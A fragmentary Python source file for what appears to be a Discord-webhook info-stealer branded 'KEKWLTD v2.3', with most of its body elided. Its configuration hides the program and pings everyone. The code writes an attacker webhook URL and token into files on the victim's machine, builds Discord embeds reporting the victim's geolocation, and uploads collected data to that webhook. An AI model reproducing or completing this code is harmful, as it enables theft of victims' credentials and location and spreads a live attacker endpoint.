...
__config__ = {
    'yourwebhookurl': "https://discord.com/api/webhooks/1101410365314711592/HXej5uy7xgX3vMmBGojOCRRktxauEWAdSwh2DPAym2Yf0QK7ECmiWihBifWttkm8AYaI",
    'hide': 'yes',
    'ping': 'yes',
    'pingtype': 'everyone',
    'fake_error':'no',
        ...
        if ntpath.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    ...
                    return
                item['kekw_is_here'] = "https://discord.com/api/webhooks/1101410365314711592/HXej5uy7xgX3vMmBGojOCRRktxauEWAdSwh2DPAym2Yf0QK7ECmiWihBifWttkm8AYaI"
            ...
            with open(config, 'a') as f:
                f.write("\n\n//KEKWLTD | https://discord.com/api/webhooks/1101410365314711592/HXej5uy7xgX3vMmBGojOCRRktxauEWAdSwh2DPAym2Yf0QK7ECmiWihBifWttkm8AYaI")
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("KEKWLTD | https://discord.com/api/webhooks/1101410365314711592/HXej5uy7xgX3vMmBGojOCRRktxauEWAdSwh2DPAym2Yf0QK7ECmiWihBifWttkm8AYaI\n\n")
            ...
            'embeds': [
                {
                    'author': {
                        'name': f'KEKWLTD v2.3',
                        'url': 'https://discord.com/api/webhooks/1101410365314711592/HXej5uy7xgX3vMmBGojOCRRktxauEWAdSwh2DPAym2Yf0QK7ECmiWihBifWttkm8AYaI',
                        'icon_url': 'https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png'
                    },
                    'color': 374276,
                    'description': f'[KEKWLTD has Geo Localised this guy]({self.googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                    ...
                    'footer': {
                        'text': 'KEKWLTD・https://discord.com/api/webhooks/1101410365314711592/HXej5uy7xgX3vMmBGojOCRRktxauEWAdSwh2DPAym2Yf0QK7ECmiWihBifWttkm8AYaI'
                    }
                }
            ]
        }
...
def upload(name, tk=''):
    ...
    if name == "bc_checking":
        ...
        "embeds": [
            ...
            "footer": {
                "text": "https://discord.com/api/webhooks/1101410365314711592/HXej5uy7xgX3vMmBGojOCRRktxauEWAdSwh2DPAym2Yf0QK7ECmiWihBifWttkm8AYaI"
            },
            'color': 374276,
            }
        ],
...
def writeforfile(data, name):
    ...
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"KEKWLTD | https://discord.com/api/webhooks/1101410365314711592/HXej5uy7xgX3vMmBGojOCRRktxauEWAdSwh2DPAym2Yf0QK7ECmiWihBifWttkm8AYaI\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
